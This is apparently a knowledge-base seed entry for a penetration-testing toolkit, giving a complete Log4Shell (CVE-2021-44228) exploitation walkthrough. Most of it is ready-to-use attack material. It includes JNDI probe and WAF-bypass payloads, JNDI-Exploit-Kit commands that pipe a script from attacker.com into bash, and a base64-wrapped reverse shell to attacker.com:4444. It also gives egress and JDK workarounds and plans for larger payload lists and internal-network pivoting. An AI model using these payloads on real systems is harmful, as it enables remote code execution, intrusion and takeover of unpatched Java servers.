# [Seed] Log4Shell (CVE-2021-44228) JNDI injection to RCE

## Scenario category
Penetration testing / Web RCE

## Goal summary
A Java Web application uses an affected Log4j2 version (< 2.17.0). Logging any user-controlled field triggers JNDI remote loading. Build an LDAP/RMI service, push a malicious class, and obtain code execution on the target.

## Full execution path

1. Identify the target.
   - HTTP headers `Server` and `X-Powered-By` contain a Java application framework (Tomcat/Spring/Liferay).
   - Fingerprint the version from the login page, 404 page, or leaked paths.
   - Confirm the vulnerability by sending a probe payload in any field that can be logged (User-Agent, Referer, X-Forwarded-For, login username, or search box).
2. Prepare an OOB listener.
   - DNSLog platform (dnslog.cn / interactsh / Burp Collaborator).
   - Self-hosted LDAP service (marshalsec / JNDI-Exploit-Kit).
3. Test for the vulnerability.
   ```
   ${jndi:ldap://abc123.dnslog.cn/x}
   ```
   Insert it into User-Agent or another field. A DNSLog record for `abc123.dnslog.cn` confirms the issue.
4. Start the exploitation service (a self-hosted public VPS or an ngrok reverse proxy).
   ```bash
   java -jar JNDI-Exploit-Kit.jar -L 0.0.0.0:1389 -P 0.0.0.0:8888 -C 'curl http://attacker.com/sh|bash'
   ```
5. Trigger the exploitation payload.
   ```
   ${jndi:ldap://attacker.com:1389/Basic/Command/base64/Y3VybCBodHRwOi8vYXR0YWNrZXIuY29tL3NofGJhc2g=}
   ```
6. Obtain a reverse shell → follow the attack-chain steps for privilege escalation and persistence.

## Pitfall log

| Problem | Cause | Solution | Time |
|------|------|---------|------|
| The probe payload produced no DNS callback | The target was on an internal network without external access | Use a DNS-only OOB service such as oast.online, or test an internal DNSLog | 1h |
| DNS resolved but LDAP did not connect | Egress policy allowed only DNS | Use DNS Exfiltration to send the data directly instead of LDAP | 1.5h |
| LDAP connected but the target did not load the class | Newer JDK versions (8u191+/11.0.1+/...) set `com.sun.jndi.ldap.object.trustURLCodebase=false` by default | Use a local gadget chain such as `Tomcat`, `Groovy`, or `BeanFactory` without remote class loading | 3h |
| Double quotes were escaped or the WAF blocked the payload | Nested `${}` expressions bypassed the existing rules | Use nested forms such as `${${::-j}ndi:...}`, `${${lower:j}ndi:...}`, or `${env:xx:-jndi}` | 1h |
| The vulnerability triggered but no shell arrived | Runtime.exec broke commands with special characters | Wrap the command in base64: `bash -c {echo,base64}|{base64,-d}|bash` | 30min |
| The Spring Boot app did not reproduce the issue | Spring uses Logback instead of Log4j2 | Inspect the dependency tree for `spring-boot-starter-log4j2` | 20min |

## Toolchain findings

- **JNDI-Exploit-Kit** (welk1n / pimps) starts LDAP+RMI+HTTP with one command and supports local gadget bypass.
- **JNDI-Injection-Exploit** is an older version with more gadget support, but it is no longer maintained.
- The **Nuclei** template `cves/2021/CVE-2021-44228.yaml` can scan assets for exposure.
- **interactsh-client** from ProjectDiscovery supports a self-hosted OOB service and is more private than dnslog.cn.
- **CrowdStrike CVE-2021-44228 scanner** detects JndiLookup.class at the binary level.

## Key code / commands

WAF-bypass payload set:

```text
${jndi:ldap://x.dnslog.cn/a}                    # Basic
${${::-j}ndi:ldap://x.dnslog.cn/a}              # Nested
${${lower:j}ndi:ldap://x.dnslog.cn/a}           # lower
${${upper:j}ndi:ldap://x.dnslog.cn/a}           # upper
${${env:NaN:-j}ndi:ldap://x.dnslog.cn/a}        # env fallback
${jndi:${lower:l}${lower:d}a${lower:p}://...}   # Split characters
${jndi:dns://x.dnslog.cn}                       # DNS channel
${jndi:rmi://attacker.com:1099/a}               # RMI instead of LDAP
```

Start interactsh:

```bash
interactsh-client -v
# Output: abc123.oast.online ← replace dnslog in the payload with this domain
```

One-command JNDI-Exploit-Kit exploitation:


```bash
java -jar JNDI-Exploit-Kit-1.0-SNAPSHOT-all.jar \
  -L attacker.com:1389 \
  -P attacker.com:8888 \
  -C 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci5jb20vNDQ0NCAwPiYx}|{base64,-d}|bash'
# Output several usable payloads. Insert one into the target.
```

## Improvement suggestions for this package

- Create `pentest-tools/references/log4shell-bypass-payloads.md` and collect more than 50 bypass payloads there.
- The Nuclei template is included. Remind users to run `nuclei -t cves/2021/CVE-2021-44228.yaml -l targets.txt`.
- Add a standard checklist to attack-chain for entering an internal network through Log4Shell.

## Reusable patterns / script fragments

**Three-step Log4Shell probe**:

```text
1. Send `${jndi:ldap://oob/a}` in several fields → check for an OOB callback
2. If a callback arrives → start a local gadget LDAP service without remote class loading → send the payload
3. If no callback arrives → switch to a DNS channel for out-of-band data exfiltration
```

**Key decisions**:

```text
- DNSLog receives a callback but LDAP fails → use a local gadget with a new JDK
- DNS also fails → use internal OOB or a second-order reflection path (first target a system with egress)
- A command with special characters gets no response → wrap it in base64
```

## Evolution actions
- [x] The routing matrix has "Log4j" / "JNDI injection" keywords
- [ ] Create log4shell-bypass-payloads.md
- [ ] Add interactsh-client to the bootstrap manifest

## Environment information
- Attack host: Kali, Java 8 (runs the LDAP service)
- OOB platform: dnslog.cn / oast.online / self-hosted interactsh
- Target: any Java Web application with Log4j2 < 2.17.0

## Redaction requirements
This seed entry is based on public CVE information and does not involve a real production target. All domains and IPs are placeholder examples.
